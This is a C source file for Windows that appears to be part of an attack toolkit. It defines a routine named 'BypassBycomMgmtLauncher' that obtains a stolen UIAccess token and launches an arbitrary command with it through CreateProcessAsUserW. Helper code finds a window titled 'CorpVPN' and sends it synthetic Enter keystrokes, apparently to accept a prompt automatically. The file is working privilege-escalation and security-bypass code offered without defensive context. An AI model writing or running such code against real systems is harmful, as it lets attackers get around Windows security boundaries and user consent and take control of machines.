#include "pch.h"

static BOOL CALLBACK EnumWindowsCallback
(
	_In_ HWND   hWnd,
	_In_ LPARAM lParam
)
{
	DWORD dwPID = 0;
	PWINDOWS_INFO pStruct = (PWINDOWS_INFO)lParam;
	WCHAR wszWindowName[0x200];
	INPUT Inputs[2];

	GetWindowThreadProcessId(hWnd, &dwPID);
	if (dwPID == pStruct->dwPID) {
		SecureZeroMemory(wszWindowName, sizeof(wszWindowName));
		GetWindowTextW(hWnd, wszWindowName, _countof(wszWindowName));
		if (!wcscmp(wszWindowName, pStruct->wszWindowsName)) {
			SetForegroundWindow(hWnd);
			SecureZeroMemory(&Inputs, sizeof(Inputs));
			Inputs[0].type = INPUT_KEYBOARD;
			Inputs[0].ki.wVk = VK_RETURN;
			Inputs[0].ki.dwFlags = KEYEVENTF_EXTENDEDKEY;

			Inputs[1].type = INPUT_KEYBOARD;
			Inputs[1].ki.wVk = VK_RETURN;
			Inputs[1].ki.dwFlags = KEYEVENTF_KEYUP;

			SendInput(_countof(Inputs), Inputs, sizeof(INPUT));
			pStruct->bIsOk = TRUE;
			return FALSE;
		}
	}

	pStruct->bIsOk = FALSE;
	return TRUE;
}

static VOID WaitWindowActive
(
	DWORD dwPid
)
{
	WINDOWS_INFO Struct;

	SecureZeroMemory(&Struct, sizeof(Struct));
	Struct.dwPID = dwPid;
	StrCpyW(Struct.wszWindowsName, L"CorpVPN");
	while (TRUE) {
		EnumWindows(EnumWindowsCallback, &Struct);
		if (Struct.bIsOk) {
			break;
		}
	}
}

BOOL BypassBycomMgmtLauncher
(
	_In_ LPWSTR lpCommand
)
{
	HANDLE hStealedToken = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	BOOL bResult = FALSE;

	hStealedToken = GetUiAccessToken();
	if (hStealedToken == NULL) {
		goto END;
	}

	SecureZeroMemory(&si, sizeof(si));
	SecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessAsUserW(hStealedToken, NULL, lpCommand, NULL, NULL, FALSE, CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		goto END;
	}

	bResult = TRUE;
END:
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	return bResult;
}